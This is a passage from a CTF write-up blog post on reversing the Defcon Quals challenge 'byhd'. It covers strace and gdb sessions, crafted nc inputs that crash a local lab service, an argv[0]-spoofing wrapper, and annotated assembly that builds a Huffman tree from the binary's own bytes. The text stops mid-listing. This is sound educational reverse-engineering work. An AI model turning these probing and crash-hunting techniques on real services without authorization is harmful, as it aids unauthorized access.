---
id: 1913
title: 'Defcon Quals writeup for byhd (reversing a Huffman Tree)'
date: '2014-05-21T11:51:30-05:00'
author: 'Ron Bowes'
layout: post
guid: 'https://blog.skullsecurity.org/?p=1913'
permalink: /2014/defcon-quals-writeup-for-byhd-reversing-a-huffman-tree
categories:
    - 'Defcon Quals 2014'
    - Hacking
    - 'Reverse Engineering'
---

This is my writeup for byhd, a 2-point challenge from the Defcon Qualifier CTF. You can get the files, including my annotated assembly file, [here](https://github.com/iagox86/defcon-ctf-2014/tree/master/byhd). This is my second (and final) writeup for the Defcon Qualifiers, you can find the writeup for shitsco [here](/2014/defcon-quals-writeup-for-shitsco-use-after-free-vuln).

This was a reverse engineering challenge where code would be constructed based on your input, then executed. You had to figure out the exact right input to generate a payload that would give you access to the server (so, in a way, there was some exploitation involved).

Up till now, [cnot](/2013/epic-cnot-writeup-plaidctf) from PlaidCTF has probably been my favourite hardcore reversing level, but I think this level has taken over. It was super fun!

## The setup

When you fire up byhd, it listens on port 9730 and waits for connections:

```
$ strace ./byhd
<span class="PreProc">[...]</span>
<span class="Statement">bind</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Statement">{</span>sa_family<span class="Normal">=</span><span class="Identifier">AF_INET</span><span class="Normal">,</span> sin_port<span class="Normal">=</span>htons<span class="Statement">(</span><span class="Constant">9730</span><span class="Statement">)</span><span class="Normal">,</span> sin_addr<span class="Normal">=</span>inet_addr<span class="Statement">(</span><span class="Constant">"192.168.1.201"</span><span class="Statement">)}</span><span class="Normal">,</span> <span class="Constant">16</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">listen</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">20</span><span class="Statement">)</span>                           <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">accept</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span>
```

When you connect, it forks off a new process, and therefore we have to fix it as described in [an old post I wrote](/2014/ghost-in-the-shellcode-ti-1337-pwnable-100) to ensure everything stays in one process (otherwise, you're gonna have a Bad Time). You also have to add a user and group and such, and you may need to run it as root.

After I fix that, it reads from the socket properly! But when I send data to it, it just disconnects me:

```

$ nc <span class="Constant">192.168</span>.<span class="Constant">1.103</span> <span class="Constant">9730</span> <span class="Normal">|</span> hexdump <span class="Normal">-</span>C
<span class="Statement">hello</span>
<span class="Statement">00000000</span>  ff ff ff ff                                       <span class="Normal">|</span>....<span class="Normal">|</span>
```

Because it's so, so common in protocols, I tried to prefix a 4-byte length to my string:

```

$ echo <span class="Normal">-</span>ne '\x04\x00\x00\x00\x41\x41\x41\x41' <span class="Normal">|</span> nc <span class="Normal">-</span>vv <span class="Constant">192.168</span>.<span class="Constant">1.103</span> <span class="Constant">9730</span>
<span class="Statement">192</span>.<span class="Constant">168.1</span>.<span class="Constant">103</span><span class="Normal">:</span> inverse host lookup failed<span class="Normal">:</span>
<span class="Statement">(</span><span class="Identifier">UNKNOWN</span><span class="Statement">)</span> <span class="Statement">[</span><span class="Constant">192.168</span>.<span class="Constant">1.103</span><span class="Statement">]</span> <span class="Constant">9730</span> <span class="Statement">(</span>?<span class="Statement">)</span> open
 sent <span class="Constant">8</span><span class="Normal">,</span> rcvd <span class="Constant">0</span>
```

No response this time? On the server side, we can see why:

```

# .<span class="Normal">/</span>byhd<span class="Normal">-</span>fixed
<span class="Statement">Segmentation</span> fault
```

The crash is really weird, too:

```

# gdb <span class="Normal">-</span>q .<span class="Normal">/</span>byhd<span class="Normal">-</span>fixed
<span class="Statement">(</span>gdb<span class="Statement">)</span> run

<span class="Statement">Program</span> received signal <span class="Identifier">SIGBUS</span><span class="Normal">,</span> Bus error.
<span class="Statement">0x0000000000401cc1</span> in ?? <span class="Statement">()</span>
<span class="Statement">(</span>gdb<span class="Statement">)</span> x<span class="Normal">/</span>i $rip
<span class="Normal">=</span>> <span class="Constant">0x401cc1</span><span class="Normal">:</span>    call   <span class="Constant">0x4010b0</span> <munmap@plt>
```

SIGBUS at a call? Wat? Instead of <tt>AAAA</tt>, let's send it <tt>\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0</tt>:

```

$ echo -ne '\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | nc -vv 192.168.1.103 9730
```

Which results in:

```

<span class="Statement">(</span>gdb<span class="Statement">)</span> run

<span class="Statement">Program</span> received signal <span class="Identifier">SIGSEGV</span><span class="Normal">,</span> Segmentation fault.
<span class="Statement">0x00007ffff7ff9000</span> in ?? <span class="Statement">()</span>
<span class="Statement">(</span>gdb<span class="Statement">)</span> x<span class="Normal">/</span><span class="Constant">8</span>i $rip
<span class="Normal">=</span>> <span class="Constant">0x7ffff7ff9000</span><span class="Normal">:</span>      push   rax
   <span class="Constant">0x7ffff7ff9001</span><span class="Normal">:</span>      nop
   <span class="Constant">0x7ffff7ff9002</span><span class="Normal">:</span>      push   rdi
   <span class="Constant">0x7ffff7ff9004</span><span class="Normal">:</span>      <span class="Statement">(</span>bad<span class="Statement">)</span>
   <span class="Constant">0x7ffff7ff9005</span><span class="Normal">:</span>      jg     <span class="Constant">0x7ffff7ff9007</span>
   <span class="Constant">0x7ffff7ff9007</span><span class="Normal">:</span>      add    dh<span class="Normal">,</span>bl
   <span class="Constant">0x7ffff7ff9009</span><span class="Normal">:</span>      fs
   <span class="Constant">0x7ffff7ff900a</span><span class="Normal">:</span>      fcomip st<span class="Normal">,</span>st<span class="Statement">(</span><span class="Constant">7</span><span class="Statement">)</span>

<span class="Statement">(</span>gdb<span class="Statement">)</span> x<span class="Normal">/</span><span class="Constant">32</span>xb $rip
<span class="Statement">0x7ffff7ff9000</span><span class="Normal">:</span> <span class="Constant">0x50</span>    <span class="Constant">0x90</span>    <span class="Constant">0xff</span>    <span class="Constant">0xf7</span>    <span class="Constant">0xff</span>    <span class="Constant">0x7f</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
<span class="Statement">0x7ffff7ff9008</span><span class="Normal">:</span> <span class="Constant">0xde</span>    <span class="Constant">0x64</span>    <span class="Constant">0xdf</span>    <span class="Constant">0xf7</span>    <span class="Constant">0xff</span>    <span class="Constant">0x7f</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
<span class="Statement">0x7ffff7ff9010</span><span class="Normal">:</span> <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
<span class="Statement">0x7ffff7ff9018</span><span class="Normal">:</span> <span class="Constant">0xc0</span>    <span class="Constant">0x53</span>    <span class="Constant">0xdf</span>    <span class="Constant">0xf7</span>    <span class="Constant">0xff</span>    <span class="Constant">0x7f</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
```

I don't know what's going on, but that sure doesn't look like code it's trying to run!

That's enough of messing around, we're gonna have to do a deep dive to figure out what's happening...

## Reading itself

After it forks off a thread, and before it reads anything from the socket, the process opens itself and reads all the bytes:

```

# strace .<span class="Normal">/</span>byhd<span class="Normal">-</span>fixed
<span class="Statement">execve</span><span class="Statement">(</span><span class="Constant">"./byhd-fixed"</span><span class="Normal">,</span> <span class="Statement">[</span><span class="Constant">"./byhd-fixed"</span><span class="Statement">]</span><span class="Normal">,</span> <span class="Statement">[</span><span class="Comment">/* 21 vars */</span><span class="Statement">])</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">brk</span><span class="Statement">(</span><span class="Constant">0</span><span class="Statement">)</span>                                  <span class="Type">=</span> <span class="Type">0x1d66000</span>
<span class="PreProc">[...]</span>
<span class="Statement">bind</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Statement">{</span>sa_family<span class="Normal">=</span><span class="Identifier">AF_INET</span><span class="Normal">,</span> sin_port<span class="Normal">=</span>htons<span class="Statement">(</span><span class="Constant">9730</span><span class="Statement">)</span><span class="Normal">,</span> sin_addr<span class="Normal">=</span>inet_addr<span class="Statement">(</span><span class="Constant">"192.168.1.103"</span><span class="Statement">)}</span><span class="Normal">,</span> <span class="Constant">16</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">listen</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">20</span><span class="Statement">)</span>                           <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">accept</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Statement">{</span>sa_family<span class="Normal">=</span><span class="Identifier">AF_INET</span><span class="Normal">,</span> sin_port<span class="Normal">=</span>htons<span class="Statement">(</span><span class="Constant">39624</span><span class="Statement">)</span><span class="Normal">,</span> sin_addr<span class="Normal">=</span>inet_addr<span class="Statement">(</span><span class="Constant">"192.168.1.201"</span><span class="Statement">)}</span><span class="Normal">,</span> <span class="Statement">[</span><span class="Constant">16</span><span class="Statement">])</span> <span class="Type">=</span> <span class="Type">4</span>
<span class="PreProc">[...]</span>
<span class="Statement">chdir</span><span class="Statement">(</span><span class="Constant">"/home/byhd"</span><span class="Statement">)</span>                     <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">stat</span><span class="Statement">(</span><span class="Constant">"./byhd-fixed"</span><span class="Normal">,</span> <span class="Statement">{</span>st_mode<span class="Normal">=</span><span class="Identifier">S_IFREG</span><span class="Normal">|</span><span class="Constant">0755</span><span class="Normal">,</span> st_size<span class="Normal">=</span><span class="Constant">18896</span><span class="Normal">,</span> ...<span class="Statement">})</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">open</span><span class="Statement">(</span><span class="Constant">"./byhd-fixed"</span><span class="Normal">,</span> <span class="Identifier">O_RDONLY</span><span class="Statement">)</span>          <span class="Type">=</span> <span class="Type">3</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\177</span><span class="Constant">ELF</span><span class="Special">\2\1\1\0\0\0\0\0\0\0\0\0\2\0</span><span class="Constant">></span><span class="Special">\0\1\0\0\0\220\2</span><span class="Constant">1@</span><span class="Special">\0\0\0\0\0</span><span class="Constant">"</span>...<span class="Normal">,</span> <span class="Constant">18896</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">18896</span>
<span class="Statement">close</span><span class="Statement">(</span><span class="Constant">3</span><span class="Statement">)</span>                                <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">4</span><span class="Normal">,</span>
<span class="PreProc">[...]</span>
```

That's interesting! First it accepts a connection, then it gets the size of itself, opens itself, and reads the whole thing. Then, finally, it tries to read from the socket it opened.

My first hunch was that it's some anti-tampering code, which isn't 100% wrong (nor was it 100% right). I threw together a quick wrapper in C to fix things:

```

<span class="PreProc">#include </span><span class="Constant"><unistd.h></span>

<span class="Type">int</span> main(<span class="Type">int</span> argc, <span class="Type">const</span> <span class="Type">char</span> *argv[])
<span class="Error">{</span>
  execlp(<span class="Constant">"/home/byhd/byhd-fixed"</span>, <span class="Constant">"/home/byhd/byhd"</span>, <span class="Constant">NULL</span>);

  printf(<span class="Constant">"Fail :(</span><span class="Special">\n</span><span class="Constant">"</span>);
  <span class="Statement">return</span> <span class="Constant">0</span>;
<span class="Error">}</span>
```

Note that I'm running "/home/byhd/fixed/byhd", but setting argv\[0\] to "/home/byhd/byhd". You can verify with strace that it indeed opens the 'real' executable and not the modified one:

```

# strace .<span class="Normal">/</span>wrapper
<span class="Statement">execve</span><span class="Statement">(</span><span class="Constant">"./wrapper"</span><span class="Normal">,</span> <span class="Statement">[</span><span class="Constant">"./wrapper"</span><span class="Statement">]</span><span class="Normal">,</span> <span class="Statement">[</span><span class="Comment">/* 21 vars */</span><span class="Statement">])</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">brk</span><span class="Statement">(</span><span class="Constant">0</span><span class="Statement">)</span>
<span class="PreProc">[...]</span>
<span class="Statement">execve</span><span class="Statement">(</span><span class="Constant">"/home/byhd/byhd-fixed"</span><span class="Normal">,</span> <span class="Statement">[</span><span class="Constant">"/home/byhd/byhd"</span><span class="Statement">]</span><span class="Normal">,</span> <span class="Statement">[</span><span class="Comment">/* 21 vars */</span><span class="Statement">])</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">brk</span><span class="Statement">(</span><span class="Constant">0</span><span class="Statement">)</span>                                  <span class="Type">=</span> <span class="Type">0x2007000</span>
<span class="PreProc">[...]</span>
<span class="Statement">chdir</span><span class="Statement">(</span><span class="Constant">"/home/byhd"</span><span class="Statement">)</span>                     <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">stat</span><span class="Statement">(</span><span class="Constant">"/home/byhd/byhd"</span><span class="Normal">,</span> <span class="Statement">{</span>st_mode<span class="Normal">=</span><span class="Identifier">S_IFREG</span><span class="Normal">|</span><span class="Constant">0644</span><span class="Normal">,</span> st_size<span class="Normal">=</span><span class="Constant">18896</span><span class="Normal">,</span> ...<span class="Statement">})</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">open</span><span class="Statement">(</span><span class="Constant">"/home/byhd/byhd"</span><span class="Normal">,</span> <span class="Identifier">O_RDONLY</span><span class="Statement">)</span>       <span class="Type">=</span> <span class="Type">3</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\177</span><span class="Constant">ELF</span><span class="Special">\2\1\1\0\0\0\0\0\0\0\0\0\2\0</span><span class="Constant">></span><span class="Special">\0\1\0\0\0\220\2</span><span class="Constant">1@</span><span class="Special">\0\0\0\0\0</span><span class="Constant">"</span>...<span class="Normal">,</span> <span class="Constant">18896</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">18896</span>
<span class="Statement">close</span><span class="Statement">(</span><span class="Constant">3</span><span class="Statement">)</span>                                <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">4</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\2</span><span class="Constant">0</span><span class="Special">\0\0\0</span><span class="Constant">"</span><span class="Normal">,</span> <span class="Constant">4</span><span class="Statement">)</span>                 <span class="Type">=</span> <span class="Type">4</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">4</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><span class="Constant">"</span><span class="Normal">,</span> <span class="Constant">16</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">16</span>
<span class="Statement">mmap</span><span class="Statement">(</span><span class="Identifier">NULL</span><span class="Normal">,</span> <span class="Constant">4096</span><span class="Normal">,</span> <span class="Identifier">PROT_READ</span><span class="Normal">|</span><span class="Identifier">PROT_WRITE</span><span class="Normal">|</span><span class="Identifier">PROT_EXEC</span><span class="Normal">,</span> <span class="Identifier">MAP_PRIVATE</span><span class="Normal">|</span><span class="Identifier">MAP_ANONYMOUS</span><span class="Normal">,</span> <span class="Normal">-</span><span class="Constant">1</span><span class="Normal">,</span> <span class="Constant">0</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">0x7f4fccf13000</span>
<span class="Normal">---</span> <span class="Identifier">SIGSEGV</span> <span class="Statement">(</span>Segmentation fault<span class="Statement">)</span> @ <span class="Constant">0</span> <span class="Statement">(</span><span class="Constant">0</span><span class="Statement">)</span> <span class="Normal">---</span>
<span class="Normal">+++</span> killed by <span class="Identifier">SIGSEGV</span> <span class="Normal">+++</span>
<span class="Statement">Segmentation</span> fault <span class="Statement">(</span>core dumped<span class="Statement">)</span>
```

## Histogram

For the next little while, I jumped around quite a bit because I wasn't sure exactly what I was trying to do. I eventually decided to start from the top; that is, the code that runs right after it reads the file.

Before I explain what's happening, let's take a look at some assembly! If you're interested in the actual code, have a look at this; otherwise, just skip past to the description. I re-implemented this in a few lines of Ruby.

Note that I've removed a bunch of in-between code, including register movement and error handling, to just show the useful parts:

```

<span class="Comment">; The function definition</span>
<span class="Statement">.text</span>:<span class="Constant">0040173B</span> <span class="Comment">; int __cdecl generate_histogram(char *itself, size_t length)</span>
<span class="Statement">.text</span>:<span class="Constant">0040173B</span>

<span class="Comment">; Allocate 0x400 bytes</span>
<span class="Statement">.text</span>:<span class="Constant">0040175F</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edi</span>, <span class="Constant">400</span><span class="Identifier">h</span>       <span class="Comment">; size</span>
<span class="Statement">.text</span>:<span class="Constant">00401764</span>                 <span class="Identifier">call</span>    <span class="Identifier">_malloc</span>         <span class="Comment">; Allocate 0x400 bytes</span>
<span class="Statement">.text</span>:<span class="Constant">00401769</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">allocated</span>], <span class="Identifier">rax</span>

<span class="Comment">; In this loop, ebx is the loop counter</span>
<span class="Statement">.text</span>:<span class="Constant">0040178C</span> <span class="Identifier">top_loop</span>:                               <span class="Comment">; CODE XREF: generate_histogram+7Cj</span>

<span class="Comment">; Point 'rax' to the current byte (the string plus the index)</span>
<span class="Statement">.text</span>:<span class="Constant">0040178C</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, <span class="Identifier">ebx</span>        <span class="Comment">; edx = current iteration</span>
<span class="Statement">.text</span>:<span class="Constant">0040178E</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">itself</span>]
<span class="Statement">.text</span>:<span class="Constant">00401792</span>                 <span class="Identifier">add</span>     <span class="Identifier">rax</span>, <span class="Identifier">rdx</span>        <span class="Comment">; Go to the current offset in the file</span>

<span class="Comment">; Read the current byte</span>
<span class="Statement">.text</span>:<span class="Constant">00401795</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">eax</span>, <span class="Identifier">byte</span> <span class="Identifier">ptr</span> [<span class="Identifier">rax</span>] <span class="Comment">; Read the current byte</span>

<span class="Comment">; Multiply it by 4</span>
<span class="Statement">.text</span>:<span class="Constant">0040179B</span>                 <span class="Identifier">lea</span>     <span class="Identifier">rdx</span>, [<span class="Identifier">rax</span>*<span class="Constant">4</span>+0]  <span class="Comment">; rdx = current_byte * 4</span>

<span class="Comment">; Set rax to that index in the array</span>
<span class="Statement">.text</span>:<span class="Constant">004017A3</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">allocated</span>] <span class="Comment">; rax = allocated buffer</span>
<span class="Statement">.text</span>:<span class="Constant">004017A7</span>                 <span class="Identifier">add</span>     <span class="Identifier">rax</span>, <span class="Identifier">rdx</span>        <span class="Comment">; Go to that offset</span>

<span class="Comment">; Increment the index</span>
<span class="Statement">.text</span>:<span class="Constant">004017AA</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, [<span class="Identifier">rax</span>]
<span class="Statement">.text</span>:<span class="Constant">004017AC</span>                 <span class="Identifier">add</span>     <span class="Identifier">edx</span>, <span class="Constant">1</span>
<span class="Statement">.text</span>:<span class="Constant">004017AF</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rax</span>], <span class="Identifier">edx</span>      <span class="Comment">; Increment that offset</span>

<span class="Comment">; Increment the loop counter</span>
<span class="Statement">.text</span>:<span class="Constant">004017B1</span>                 <span class="Identifier">add</span>     <span class="Identifier">ebx</span>, <span class="Constant">1</span>
<span class="Statement">.text</span>:<span class="Constant">004017B4</span>
<span class="Statement">.text</span>:<span class="Constant">004017B4</span> <span class="Identifier">bottom_loop</span>:                            <span class="Comment">; CODE XREF: generate_histogram+4Fj</span>

<span class="Comment">; Loop till we're at the end, then return</span>
<span class="Statement">.text</span>:<span class="Constant">004017B4</span>                 <span class="Identifier">cmp</span>     <span class="Identifier">ebx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">itself_length</span>]
<span class="Statement">.text</span>:<span class="Constant">004017B7</span>                 <span class="Identifier">jb</span>      <span class="Identifier">short</span> <span class="Identifier">top_loop</span>
<span class="Statement">.text</span>:<span class="Constant">004017C9</span>                 <span class="Identifier">retn</span>
```

It turns out, the code generates a histogram based on the executable file. In other words, it basically does this:

```

data = <span class="Type">File</span>.new(<span class="Identifier">ARGV</span>[<span class="Constant">0</span>]).read

histogram = {}
histogram.default = <span class="Constant">0</span>

data.each_byte() <span class="Statement">do</span> |<span class="Identifier">b</span>|
  histogram[b.chr] = histogram[b.chr] + <span class="Constant">1</span>
<span class="Statement">end</span>
puts(histogram)
```

Which might look like:

```

$ ruby histogram.rb <span class="Special">/</span><span class="Constant">etc</span><span class="Special">/</span>passwd
{<span class="Special">"</span><span class="Constant">r</span><span class="Special">"</span>=><span class="Constant">73</span>, <span class="Special">"</span><span class="Constant">o</span><span class="Special">"</span>=><span class="Constant">119</span>, <span class="Special">"</span><span class="Constant">t</span><span class="Special">"</span>=><span class="Constant">54</span>, <span class="Special">"</span><span class="Constant">:</span><span class="Special">"</span>=><span class="Constant">204</span>, <span class="Special">"</span><span class="Constant">x</span><span class="Special">"</span>=><span class="Constant">38</span>, <span class="Special">"</span><span class="Constant">0</span><span class="Special">"</span>=><span class="Constant">39</span>, <span class="Special">"</span><span class="Constant">/</span><span class="Special">"</span>=><span class="Constant">141</span>, <span class="Special">"</span><span class="Constant">b</span><span class="Special">"</span>=><span class="Constant">78</span>, <span class="Special">"</span><span class="Constant">i</span><span class="Special">"</span>=><span class="Constant">80</span>, <span class="Special">"</span><span class="Constant">n</span><span class="Special">"</span>=><span class="Constant">107</span>, <span class="Special">"</span><span class="Constant">a</span><span class="Special">"</span>=><span class="Constant">105</span>, <span class="Special">"</span><span class="Constant">s</span><span class="Special">"</span>=><span class="Constant">78</span>, <span class="Special">"</span><span class="Constant">h</span><span class="Special">"</span>=><span class="Constant">22</span>, <span class="Special">"</span><span class="Special">\n</span><span class="Special">"</span>=><span class="Constant">34</span>, <span class="Special">"</span><span class="Constant">1</span><span class="Special">"</span>=><span class="Constant">41</span>, <span class="Special">"</span><span class="Constant">f</span><span class="Special">"</span>=><span class="Constant">27</span>, <span class="Special">"</span><span class="Constant">l</span><span class="Special">"</span>=><span class="Constant">71</span>, <span class="Special">"</span><span class="Constant">e</span><span class="Special">"</span>=><span class="Constant">85</span>, <span class="Special">"</span><span class="Constant">d</span><span class="Special">"</span>=><span class="Constant">81</span>, <span class="Special">"</span><span class="Constant">m</span><span class="Special">"</span>=><span class="Constant">35</span>, <span class="Special">"</span><span class="Constant">2</span><span class="Special">"</span>=><span class="Constant">18</span>, <span class="Special">"</span><span class="Constant">3</span><span class="Special">"</span>=><span class="Constant">16</span>, <span class="Special">"</span><span class="Constant">4</span><span class="Special">"</span>=><span class="Constant">13</span>, <span class="Special">"</span><span class="Constant">v</span><span class="Special">"</span>=><span class="Constant">21</span>, <span class="Special">"</span><span class="Constant">p</span><span class="Special">"</span>=><span class="Constant">58</span>, <span class="Special">"</span><span class="Constant">7</span><span class="Special">"</span>=><span class="Constant">3</span>, <span class="Special">"</span><span class="Constant">y</span><span class="Special">"</span>=><span class="Constant">31</span>, <span class="Special">"</span><span class="Constant">c</span><span class="Special">"</span>=><span class="Constant">13</span>, <span class="Special">"</span><span class="Constant">5</span><span class="Special">"</span>=><span class="Constant">12</span>, <span class="Special">"</span><span class="Constant">u</span><span class="Special">"</span>=><span class="Constant">33</span>, <span class="Special">"</span><span class="Constant">w</span><span class="Special">"</span>=><span class="Constant">9</span>, <span class="Special">"</span><span class="Constant">6</span><span class="Special">"</span>=><span class="Constant">10</span>, <span class="Special">"</span><span class="Constant">9</span><span class="Special">"</span>=><span class="Constant">3</span>, <span class="Special">"</span><span class="Constant">g</span><span class="Special">"</span>=><span class="Constant">39</span>, <span class="Special">"</span><span class="Constant"> </span><span class="Special">"</span>=><span class="Constant">68</span>, <span class="Special">"</span><span class="Constant">8</span><span class="Special">"</span>=><span class="Constant">6</span>, <span class="Special">"</span><span class="Constant">+</span><span class="Special">"</span>=><span class="Constant">2</span>, <span class="Special">"</span><span class="Constant">q</span><span class="Special">"</span>=><span class="Constant">2</span>, <span class="Special">"</span><span class="Constant">k</span><span class="Special">"</span>=><span class="Constant">7</span>, <span class="Special">"</span><span class="Constant">z</span><span class="Special">"</span>=><span class="Constant">4</span>, <span class="Special">"</span><span class="Constant">-</span><span class="Special">"</span>=><span class="Constant">1</span>}
```

Running that code on the actual binary, it works great; but it's a lot longer and much uglier output, so I didn't want to include it here. Feel free to try :)

I was still working off the assumption this was all anti-tampering code. As I said earlier, that was only partly right...

## Building a tree

This is where it started to get weird and interesting. I could understand the histogram being generated, but then it stated adding and removing stuff from the array! What was happening!?

Once again, here's the actual annotated code, with the error handling and stuff removed. Feel free to read or skip it!

```

<span class="Statement">.text</span>:<span class="Constant">00402127</span> <span class="Identifier">enter_second_loop</span>:                      <span class="Comment">; CODE XREF: generate_block_tree+2AFj</span>

<span class="Comment">; Remove and store the smallest entry</span>
<span class="Statement">.text</span>:<span class="Constant">00402127</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">entry_list</span>] <span class="Comment">; An array of 256 8-byte values, each of which points to 20 bytes of allocated memory</span>
<span class="Statement">.text</span>:<span class="Constant">0040212B</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>        <span class="Comment">; allocated_block</span>
<span class="Statement">.text</span>:<span class="Constant">0040212E</span>                 <span class="Identifier">call</span>    <span class="Identifier">get_smallest_entry</span> <span class="Comment">; Removes the smallest histogram entry from the list and returns it</span>
<span class="Statement">.text</span>:<span class="Constant">00402133</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">smallest_entry</span>], <span class="Identifier">rax</span>

<span class="Comment">; Remove and store the next smallest entry</span>
<span class="Statement">.text</span>:<span class="Constant">00402137</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">entry_list</span>] <span class="Comment">; An array of 256 8-byte values, each of which points to 20 bytes of allocated memory</span>
<span class="Statement">.text</span>:<span class="Constant">0040213B</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>        <span class="Comment">; allocated_block</span>
<span class="Statement">.text</span>:<span class="Constant">0040213E</span>                 <span class="Identifier">call</span>    <span class="Identifier">get_smallest_entry</span> <span class="Comment">; Removes the smallest histogram entry from the list and returns it</span>
<span class="Statement">.text</span>:<span class="Constant">00402143</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">next_smallest_entry</span>], <span class="Identifier">rax</span>

<span class="Comment">; Allocate memory for a new entry</span>
<span class="Statement">.text</span>:<span class="Constant">00402165</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edi</span>, <span class="Constant">20</span><span class="Identifier">h</span>        <span class="Comment">; size</span>
<span class="Statement">.text</span>:<span class="Constant">0040216A</span>                 <span class="Identifier">call</span>    <span class="Identifier">_malloc</span>         <span class="Comment">; Allocate space for a new entry</span>
<span class="Statement">.text</span>:<span class="Constant">0040216F</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">new_entry</span>], <span class="Identifier">rax</span>

<span class="Comment">; Store the smallest entry in the 'left' branch</span>
<span class="Statement">.text</span>:<span class="Constant">004021B2</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">new_entry</span>]
<span class="Statement">.text</span>:<span class="Constant">004021B6</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">smallest_entry</span>]
<span class="Statement">.text</span>:<span class="Constant">004021BA</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.left</span><span class="Identifier">_histogram</span>], <span class="Identifier">rdx</span>

<span class="Comment">; Store the next-smallest entry in the 'right' branch</span>
<span class="Statement">.text</span>:<span class="Constant">004021BD</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">new_entry</span>]
<span class="Statement">.text</span>:<span class="Constant">004021C1</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">next_smallest_entry</span>]
<span class="Statement">.text</span>:<span class="Constant">004021C5</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.right</span><span class="Identifier">_histogram</span>], <span class="Identifier">rdx</span>

<span class="Comment">; Get the sum of the two entry values (the character counts, if they're leaf nodes)</span>
<span class="Statement">.text</span>:<span class="Constant">004021E2</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">smallest_entry</span>] <span class="Comment">; ** This section puts the two smallest histograms into a new field, then puts their sum into the 'value' entry</span>
<span class="Statement">.text</span>:<span class="Constant">004021E6</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.histogram</span><span class="Identifier">_entry</span>]
<span class="Statement">.text</span>:<span class="Constant">004021E9</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">next_smallest_entry</span>]
